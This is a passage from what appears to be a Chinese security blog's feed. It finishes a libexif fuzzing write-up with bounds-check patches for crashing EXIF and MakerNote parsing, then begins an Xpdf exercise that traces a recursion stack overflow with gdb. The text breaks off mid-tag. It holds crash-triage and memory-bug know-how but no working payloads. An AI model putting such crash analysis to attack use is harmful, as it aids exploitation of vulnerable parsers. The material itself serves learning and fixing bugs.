2</strong>之后就溢出了，那这里应该先对offfset做个校验比如<code>if (offset &gt; ds || offset + 6 + 2 &gt; ds)</code>,回看之前的代码，发现之间还有调用offset的函数，我们应该在获取offset后做校验。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IFD 头部至少需要：2 字节（条目数）</span></span><br><span class="line"><span class="keyword">if</span> (offset &gt; ds - <span class="number">6</span> || offset + <span class="number">2</span> &gt; ds - <span class="number">6</span>) &#123;  </span><br><span class="line">    exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">              <span class="string">&quot;ExifData&quot;</span>, </span><br><span class="line">              _(<span class="string">&quot;Invalid IFD0 offset or data truncated&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入这样一行就能保证之后不会报错，我们尝试这样修改看能不能避免所有crash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;-O0 -g&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_15-release/</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/fix/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/fix/&quot;</span> PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing_libexif/fix/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>可以看到样例7成功修复<br><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012100645853.png"></p><p>我们再试试其他crash样例是否可以捕捉到，发现另一组仍然是有段错误我们接着分析做个bug</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012100838426.png"></p></li><li><p>接下来处理厂商特定的 MakerNote，我们发现crash是在<code>exif_mnote_data_load</code>函数，我们之间先去函数中找crash的点，</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012105732610.png"></p></li></ul><p>​    我们可以明显发现在<code>exif_mnote_data_canon_load</code>中这里s明显长度是不对的，我们溯源这个s的来源，可以看到是<code>s = exif_format_get_size (n-&gt;entries[i].format) * n-&gt;entries[i].components;</code>我们可以分别<code>exif_format_get_size (n-&gt;entries[i].format) </code>和<code>n-&gt;entries[i].components</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012143813053.png"></p><p>这里<code>exif_format_get_size (n-&gt;entries[i].format) </code>没什么问题，看看<code>n-&gt;entries[i].components</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012143900048.png"></p><p>可以看到是这里出了问题，我们再往前看看，可以发现<code>n-&gt;entries[i].components = exif_get_long (buf + o + 4, n-&gt;order);</code>这里大概率是buf中的数据比较大，但是这里没有校验</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012144220760.png"></p><p>可以看到就是数据出了问题这里应该增加校验,在<code>s = exif_format_get_size (n-&gt;entries[i].format) * n-&gt;entries[i].components;</code>前后添加校验。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********添加fix********/</span></span><br><span class="line">  <span class="comment">// ✅ 检查 1：能否读取条目头</span></span><br><span class="line">      <span class="keyword">if</span> (o + <span class="number">12</span> &gt; buf_size) &#123;</span><br><span class="line">          exif_log (ne-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">                    <span class="string">&quot;Canon MakerNote&quot;</span>, </span><br><span class="line">                    <span class="string">&quot;Entry %u header exceeds buffer&quot;</span>, i);</span><br><span class="line">          <span class="keyword">break</span>;  <span class="comment">// 后续条目都不可访问</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">/********添加fix********/</span></span><br><span class="line"> s = exif_format_get_size (n-&gt;entries[i].format) * n-&gt;entries[i].components;</span><br><span class="line"><span class="comment">/********添加fix********/</span></span><br><span class="line">      <span class="comment">// ✅ 检查 2：s 本身是否合理</span></span><br><span class="line">      <span class="keyword">if</span> (s == <span class="number">0</span> || s &gt; buf_size) &#123;</span><br><span class="line">          exif_log (ne-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">                    <span class="string">&quot;Canon MakerNote&quot;</span>, </span><br><span class="line">                    <span class="string">&quot;Entry %u invalid size: %u&quot;</span>, i, s);</span><br><span class="line">          <span class="keyword">continue</span>;  <span class="comment">// 跳过这个条目</span></span><br><span class="line">      &#125;</span><br><span class="line"> <span class="comment">// ✅ 检查 3：源数据位置是否越界</span></span><br><span class="line">      <span class="keyword">if</span> (o + s &gt; buf_size) &#123;</span><br><span class="line">          exif_log (ne-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">                    <span class="string">&quot;Canon MakerNote&quot;</span>, </span><br><span class="line">                    <span class="string">&quot;Entry %u data at offset %u size %u exceeds buffer %u&quot;</span>,</span><br><span class="line">                    i, o, s, buf_size);</span><br><span class="line">          <span class="keyword">continue</span>;  <span class="comment">// 跳过这个条目</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">/********添加fix********/</span></span><br></pre></td></tr></table></figure><p>删除fix文件夹，再次修复</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> CFLAGS=<span class="string">&quot;-O0 -g&quot;</span></span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif<span class="number">-0</span>_6_15-release/</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;$HOME/fuzzing_libexif/fix/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">cd $HOME/fuzzing_libexif/exif-exif<span class="number">-0</span>_6_15-release</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;$HOME/fuzzing_libexif/fix/&quot;</span> PKG_CONFIG_PATH=$HOME/fuzzing_libexif/fix/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012151329309.png"></p><p>可以看到这里已经修复了。</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing 101-Exercise 1 - Xpdf</title>
      <link href="/2025/10/10/Fuzzing%20101-Exercise%201%20-%20Xpdf/"/>
      <url>/2025/10/10/Fuzzing%20101-Exercise%201%20-%20Xpdf/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzzing-101-Exercise-1-Xpdf"><a href="#Fuzzing-101-Exercise-1-Xpdf" class="headerlink" title="Fuzzing 101-Exercise 1 - Xpdf"></a>Fuzzing 101-Exercise 1 - Xpdf</h1><p>这里关于fuzz的部分我就不过多赘述了，文档给的都很清楚，我们直接从获取到能造成crash的样例开始。</p><p>获取到样例之后我们先放入gdb中测试一下，注意这里要将文件程序编译一下以便我们调试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CFLAGS=<span class="string">&quot;-g -O0&quot;</span> CXXFLAGS=<span class="string">&quot;-g -O0&quot;</span> ./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_xpdf/debug/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这样就生成了一个可供我们调试的程序</p><p>我们再通过</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb --args ./debug/bin/pdftotext <span class="string">&#x27;./out/default/crashes/id:000000,sig:11,src:000001,time:203780,execs:143963,op:havoc,rep:2&#x27;</span> ./output</span><br></pre></td></tr></table></figure><p>来调试程序，我们直接run看看程序是怎么崩溃的</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008164058072.png"></p><p>我们发现栈顶指针已经指向了一块不可读的地址，说明已经出现问题了，</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008164213407.png"></p><p>我们可以看到栈地址已经超出了给定的上限，这里大概率发生了栈上溢，我们使用bt命令回溯一下栈帧。</p><p>发现出现了大量重复的函数调用，可以猜想到这里可能函数反复递归从而使得栈不断增长从而填满了栈空间</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008164913032.png"></p><p>产看到是从上图画框开始重复调用的，看到调用<code>XRef::fetch</code>的时候num和gen的值，我们尝试使用这两个值来当做断点的条件看看能不能定位到开始崩溃的时候。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b XRef::fetch <span class="keyword">if</span> num==7</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008165628417.png"></p><p>我们再run一遍，这时候再使用bt命令看看栈帧</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008165746736.png"></p><p>使用c我们看看栈帧</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008165908332.png"></p><p>很巧的是恰好开始递归，我们再c两遍确认一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008170106550.png"></p><p>这里我们已经可以完全确定之前就是递归的开始了，我们尝试从这个函数入手。由于有多个getObj我们先动态调试一下确定这个环的关键节点</p><p>我们开始单步执行，发现执行完下图的函数后会再次回来，我们进入这个函数看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008171517588.png"></p><p>这里进入后先不要着急，我们看看之前的栈帧，发现调用的是makeStream函数，而且通过看源代码发现getObj只调用了一次makeStream函数那么应该就是这里了，然后 makeStream 也只有一个地方调用dictLookup，</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008183327853.png"></p><p>我们再观察dictLookup函数</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008183345403.png"></p><p>发现直接调用了lookup，而lookup调用了fetch，也就是object::fetch，我们进入看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008183759901.png"></p><p>这里调用了XRef::fetch回到了最开始那个函数，这下这个环是已经清楚了，我们再从调用这个环的displaypages开始看起。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008184124462.png"></p><p>我们可以看到displayPages调用了displayPage来实际渲染</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PDFDoc::displayPages</span><span class="params">(OutputDev *out, <span class="keyword">int</span> firstPage, <span class="keyword">int</span> lastPage,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">double</span> hDPI, <span class="keyword">double</span> vDPI, <span class="keyword">int</span> rotate,</span></span></span><br><span class="line"><span class="params"><span class="function">        GBool useMediaBox, GBool crop, GBool printing,</span></span></span><br><span class="line"><span class="params"><span class="function">        GBool (*abortCheckCbk)(<span class="keyword">void</span> *data),</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">void</span> *abortCheckCbkData)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> page;  <span class="comment">// 循环计数器，用于遍历页码</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 从起始页到结束页逐页循环</span></span><br><span class="line">  <span class="comment">// 注意：PDF页码通常从1开始，不是从0开始</span></span><br><span class="line">  <span class="keyword">for</span> (page = firstPage; page &lt;= lastPage; ++page) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用单页渲染函数，传递所有参数</span></span><br><span class="line">    <span class="comment">// displayPage() 是实际执行渲染工作的函数</span></span><br><span class="line">    <span class="comment">// 它会：</span></span><br><span class="line">    <span class="comment">// 1. 获取指定页面的页面对象</span></span><br><span class="line">    <span class="comment">// 2. 解析页面的内容流（Content Stream）</span></span><br><span class="line">    <span class="comment">// 3. 执行页面上的所有绘图操作</span></span><br><span class="line">    <span class="comment">// 4. 将结果输出到 OutputDev 设备</span></span><br><span class="line">    <span class="built_in">displayPage</span>(out, page, hDPI, vDPI, rotate, useMediaBox, crop, printing,</span><br><span class="line">                abortCheckCbk, abortCheckCbkData);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后从文档目录中获取指定页面对象，并调用其 display 方法进行渲染</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PDFDoc::displayPage</span><span class="params">(OutputDev *out, <span class="keyword">int</span> page,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">double</span> hDPI, <span class="keyword">double</span> vDPI, <span class="keyword">int</span> rotate,</span></span></span><br><span class="line"><span class="params"><span class="function"> GBool useMediaBox, GBool crop, GBool printing,</span></span></span><br><span class="line"><span class="params"><span class="function"> GBool (*abortCheckCbk)(<span class="keyword">void</span> *data),</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">void</span> *abortCheckCbkData)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 如果全局参数启用了打印命令选项，则输出当前正在处理的页码</span></span><br><span class="line">  <span class="keyword">if</span> (globalParams-&gt;<span class="built_in">getPrintCommands</span>()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;***** page %d *****\n&quot;</span>, page);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 从文档目录中获取指定页面对象，并调用其 display 方法进行渲染</span></span><br><span class="line">  <span class="comment">// 将所有参数传递给页面的 display 方法，包括目录对象和中止检查回调</span></span><br><span class="line">  catalog-&gt;<span class="built_in">getPage</span>(page)-&gt;<span class="built_in">display</span>(out, hDPI, vDPI,</span><br><span class="line">  rotate, useMediaBox, crop, printing, catalog,</span><br><span class="line">  abortCheckCbk, abortCheckCbkData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用displaySlice方法显示整个页面</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Page::display</span><span class="params">(OutputDev *out, <span class="keyword">double</span> hDPI, <span class="keyword">double</span> vDPI,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">int</span> rotate, GBool useMediaBox, GBool crop,</span></span></span><br><span class="line"><span class="params"><span class="function">   GBool printing, Catalog *catalog,</span></span></span><br><span class="line"><span class="params"><span class="function">   GBool (*abortCheckCbk)(<span class="keyword">void</span> *data),</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">void</span> *abortCheckCbkData)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 调用 displaySlice 方法显示整个页面</span></span><br><span class="line">  <span class="comment">// 传入 -1, -1, -1, -1 表示不进行切片，显示完整的页面内容</span></span><br><span class="line">  <span class="comment">// （sliceX, sliceY, sliceW, sliceH 都为 -1 时表示显示整页）</span></span><br><span class="line">  <span class="built_in">displaySlice</span>(out, hDPI, vDPI, rotate, useMediaBox, crop,</span><br><span class="line">       <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, printing, catalog,</span><br><span class="line">       abortCheckCbk, abortCheckCbkData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是遇到我们这个会导致重复调用的环的入口,也就是下面函数的contents.fetch(xref, &amp;obj);</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Page::displaySlice</span><span class="params">(OutputDev *out, <span class="keyword">double</span> hDPI, <span class="keyword">double</span> vDPI,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> rotate, GBool useMediaBox, GBool crop,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> sliceX, <span class="keyword">int</span> sliceY, <span class="keyword">int</span> sliceW, <span class="keyword">int</span> sliceH,</span></span></span><br><span class="line"><span class="params"><span class="function">GBool printing, Catalog *catalog,</span></span></span><br><span class="line"><span class="params"><span class="function">GBool (*abortCheckCbk)(<span class="keyword">void</span> *data),</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">void</span> *abortCheckCbkData)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PDF_PARSER_ONLY</span></span><br><span class="line">  PDFRectangle *mediaBox, *cropBox;  <span class="comment">// 媒体框和裁剪框</span></span><br><span class="line">  PDFRectangle box;                   <span class="comment">// 实际显示区域</span></span><br><span class="line">  Gfx *gfx;                          <span class="comment">// 图形上下文对象</span></span><br><span class="line">  Object obj;                        <span class="comment">// PDF对象</span></span><br><span class="line">  Annots *annotList;                 <span class="comment">// 注释列表</span></span><br><span class="line">  Dict *acroForm;                    <span class="comment">// AcroForm表单字典</span></span><br><span class="line">  <span class="keyword">int</span> i;                             <span class="comment">// 循环变量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查输出设备是否支持显示此页面切片</span></span><br><span class="line">  <span class="comment">// 如果不支持，直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (!out-&gt;<span class="built_in">checkPageSlice</span>(<span class="keyword">this</span>, hDPI, vDPI, rotate, useMediaBox, crop,</span><br><span class="line">   sliceX, sliceY, sliceW, sliceH,</span><br><span class="line">   printing, catalog,</span><br><span class="line">   abortCheckCbk, abortCheckCbkData)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算最终的旋转角度（累加页面自身的旋转角度）</span></span><br><span class="line">  rotate += <span class="built_in">getRotate</span>();</span><br><span class="line">  <span class="comment">// 将旋转角度规范化到0-359度范围内</span></span><br><span class="line">  <span class="keyword">if</span> (rotate &gt;= <span class="number">360</span>) &#123;</span><br><span class="line">    rotate -= <span class="number">360</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rotate &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rotate += <span class="number">360</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据DPI、旋转角度等参数计算实际的显示区域</span></span><br><span class="line">  <span class="built_in">makeBox</span>(hDPI, vDPI, rotate, useMediaBox, out-&gt;<span class="built_in">upsideDown</span>(),</span><br><span class="line">  sliceX, sliceY, sliceW, sliceH, &amp;box, &amp;crop);</span><br><span class="line">  cropBox = <span class="built_in">getCropBox</span>();  <span class="comment">// 获取页面的裁剪框</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果启用了命令打印（调试模式），输出页面框信息</span></span><br><span class="line">  <span class="keyword">if</span> (globalParams-&gt;<span class="built_in">getPrintCommands</span>()) &#123;</span><br><span class="line">    mediaBox = <span class="built_in">getMediaBox</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;***** MediaBox = ll:%g,%g ur:%g,%g\n&quot;</span>,</span><br><span class="line">   mediaBox-&gt;x1, mediaBox-&gt;y1, mediaBox-&gt;x2, mediaBox-&gt;y2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;***** CropBox = ll:%g,%g ur:%g,%g\n&quot;</span>,</span><br><span class="line">   cropBox-&gt;x1, cropBox-&gt;y1, cropBox-&gt;x2, cropBox-&gt;y2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;***** Rotate = %d\n&quot;</span>, attrs-&gt;<span class="built_in">getRotate</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建图形上下文对象，用于渲染页面内容</span></span><br><span class="line">  gfx = <span class="keyword">new</span> <span class="built_in">Gfx</span>(xref, out, num, attrs-&gt;<span class="built_in">getResourceDict</span>(),</span><br><span class="line">hDPI, vDPI, &amp;box, crop ? cropBox : (PDFRectangle *)<span class="literal">NULL</span>,</span><br><span class="line">rotate, abortCheckCbk, abortCheckCbkData);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取页面内容流</span></span><br><span class="line">  contents.<span class="built_in">fetch</span>(xref, &amp;obj);</span><br><span class="line">  <span class="keyword">if</span> (!obj.<span class="built_in">isNull</span>()) &#123;</span><br><span class="line">    <span class="comment">// 保存图形状态</span></span><br><span class="line">    gfx-&gt;<span class="built_in">saveState</span>();</span><br><span class="line">    <span class="comment">// 显示页面内容</span></span><br><span class="line">    gfx-&gt;<span class="built_in">display</span>(&amp;obj);</span><br><span class="line">    <span class="comment">// 恢复图形状态</span></span><br><span class="line">    gfx-&gt;<span class="built_in">restoreState</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  obj.<span class="built_in">free</span>();  <span class="comment">// 释放对象</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// === 处理注释部分 ===</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建注释列表</span></span><br><span class="line">  annotList = <span class="keyword">new</span> <span class="built_in">Annots</span>(xref, catalog, <span class="built_in">getAnnots</span>(&amp;obj));</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取AcroForm表单（如果存在）</span></span><br><span class="line">  acroForm = catalog-&gt;<span class="built_in">getAcroForm</span>()-&gt;<span class="built_in">isDict</span>() ?</span><br><span class="line">               catalog-&gt;<span class="built_in">getAcroForm</span>()-&gt;<span class="built_in">getDict</span>() : <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 检查是否需要生成注释外观</span></span><br><span class="line">  <span class="keyword">if</span> (acroForm) &#123;</span><br><span class="line">    <span class="keyword">if</span> (acroForm-&gt;<span class="built_in">lookup</span>(<span class="string">&quot;NeedAppearances&quot;</span>, &amp;obj)) &#123;</span><br><span class="line">      <span class="comment">// 如果NeedAppearances标志为true，则自动生成注释外观</span></span><br><span class="line">      <span class="keyword">if</span> (obj.<span class="built_in">isBool</span>() &amp;&amp; obj.<span class="built_in">getBool</span>()) &#123;</span><br><span class="line">annotList-&gt;<span class="built_in">generateAppearances</span>(acroForm);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    obj.<span class="built_in">free</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果存在注释，则绘制所有注释</span></span><br><span class="line">  <span class="keyword">if</span> (annotList-&gt;<span class="built_in">getNumAnnots</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (globalParams-&gt;<span class="built_in">getPrintCommands</span>()) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Annotations\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历所有注释并绘制</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; annotList-&gt;<span class="built_in">getNumAnnots</span>(); ++i) &#123;</span><br><span class="line">      annotList-&gt;<span class="built_in">getAnnot</span>(i)-&gt;<span class="built_in">draw</span>(gfx, printing);</span><br><span class="line">    &#125;</span><br><span class="line">    out-&gt;<span class="built_in">dump</span>();  <span class="comment">// 刷新输出缓冲区</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 清理资源</span></span><br><span class="line">  <span class="keyword">delete</span> annotList;</span><br><span class="line">  <span class="keyword">delete</span> gfx;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到这里的xref</p><p>我们通过动态调试获取调用函数时xref的结构，我们简单看看这个结构体。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008200058726.png"></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">str = <span class="number">0x5555556cac00</span>,        <span class="comment">// 文件流指针</span></span><br><span class="line">start = <span class="number">0</span>,                   <span class="comment">// 起始对象编号</span></span><br><span class="line">entries = <span class="number">0x5555556caf70</span>,    <span class="comment">// 交叉引用条目数组指针</span></span><br><span class="line">size = <span class="number">256</span>,                  <span class="comment">// 总对象数量</span></span><br><span class="line">rootNum = <span class="number">5</span>,                 <span class="comment">// Catalog对象的对象编号</span></span><br><span class="line">rootGen = <span class="number">0</span>,                 <span class="comment">// Catalog对象的生成号</span></span><br><span class="line">ok = <span class="number">1</span>,                      <span class="comment">// xref表状态正常</span></span><br><span class="line">errCode = <span class="number">0</span>,                 <span class="comment">// 无错误</span></span><br><span class="line">trailerDict = &#123;              <span class="comment">// PDF文件的trailer字典</span></span><br><span class="line">    type = objDict,          <span class="comment">// 类型为字典对象</span></span><br><span class="line">    dict = <span class="number">0x5555556cbf70</span>    <span class="comment">// 指向实际字典数据的指针</span></span><br><span class="line">&#125;</span><br><span class="line">lastXRefPos = <span class="number">146</span>,           <span class="comment">// 最后一个交叉引用表的位置</span></span><br><span class="line">streamEnds = <span class="number">0x5555556bfc80</span>, <span class="comment">// 流结束位置数组</span></span><br><span class="line">streamEndsLen = <span class="number">2</span>,           <span class="comment">// 流结束位置数组长度</span></span><br><span class="line">encrypted = <span class="number">0</span>,               <span class="comment">// 文档未加密</span></span><br><span class="line">permFlags = <span class="number">65532</span>,           <span class="comment">// 权限标志（打印、修改等）</span></span><br><span class="line">ownerPasswordOk = <span class="number">0</span>,         <span class="comment">// 未使用所有者密码</span></span><br><span class="line">fileKey = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;, <span class="comment">// 文件密钥（全零，未加密）</span></span><br><span class="line">keyLength = <span class="number">0</span>,               <span class="comment">// 密钥长度</span></span><br><span class="line">encVersion = <span class="number">0</span>,              <span class="comment">// 加密版本</span></span><br><span class="line">encAlgorithm = cryptRC4      <span class="comment">// 加密算法（但未使用）</span></span><br></pre></td></tr></table></figure><p>这里我们进入函数直接看调用xref-&gt;fetch(ref.num, ref.gen, obj) 的部分</p><p>这里直接让num为7，gen为0再停下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008202429866.png"></p><p>这里的num和gen是什么那？我们先看看XRef是什么</p><h3 id="XRef表的精确结构"><a href="#XRef表的精确结构" class="headerlink" title="XRef表的精确结构"></a>XRef表的精确结构</h3><p>传统XRef表(PDF 1.0至今支持)采用严格的20字节定长格式。 <a href="https://labs.appligent.com/appligent-labs/pdfblog/pdf_cross_reference_table">Appligent</a>表结构位于PDF文件末尾附近，通过文件尾部的<code>startxref</code>关键字指向其字节偏移量。 <a href="https://medium.com/@jberkenbilt/the-structure-of-a-pdf-file-6f08114a58f6">medium +4</a>每个条目格式为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">起始对象编号 条目数量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nnnnnnnnnn ggggg t&lt;EOL&gt;</span><br></pre></td></tr></table></figure><p><strong>字段解析：</strong></p><ul><li>最开始一行是起始编号和条目数量，比如下面的实例里就是从0开始6个条目</li></ul><ul><li><strong>nnnnnnnnnn</strong>：10位数字，表示从文件开头到对象的字节偏移量，必须用0填充 <a href="https://brendanzagaeski.appspot.com/0005.html">appspot +2</a></li><li><strong>ggggg</strong>：5位数字的generation number(代世号),也就是后面出现的gen</li><li><strong>t</strong>：单字符标志，<code>n</code>表示使用中(in-use)，<code>f</code>表示空闲(free) <a href="https://labs.appligent.com/appligent-labs/pdfblog/pdf_cross_reference_table">Appligent</a></li><li>**<EOL>**：2字节的行结束符( <a href="https://pypdf2.readthedocs.io/en/3.x/dev/pdf-format.html">Readthedocs</a><a href="https://pypdf2.readthedocs.io/en/3.0.0/dev/pdf-format.html">Readthedocs</a>SP+CR、SP+LF或CR+LF) <a href="https://brendanzagaeski.appspot.com/0005.html">appspot +2</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xref</span><br><span class="line">0 6</span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000015 00000 n </span><br><span class="line">0000000102 00000 n </span><br><span class="line">0000000287 00000 n </span><br><span class="line">0000000456 00000 n </span><br><span class="line">0000000637 00000 n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Size 6</span><br><span class="line">  /Root 1 0 R</span><br><span class="line">  /Info 5 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">1234</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p><strong>特殊对象0：</strong>第一个条目始终为<code>0000000000 65535 f</code>，作为空闲对象链表的头部，generation number固定为65535。这个条目在每个PDF文件中都是必需的。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008212438128.png"></p><p>上图就是我们样例的xref</p><p>我们可以看到是没有0的，但是我们这里是从4开始的，也就是说对应的num7为<code>0000000781 00000 n </code></p><p>我们接着跟进这里直接看调用Parser::getObj函数的时候</p><p><img 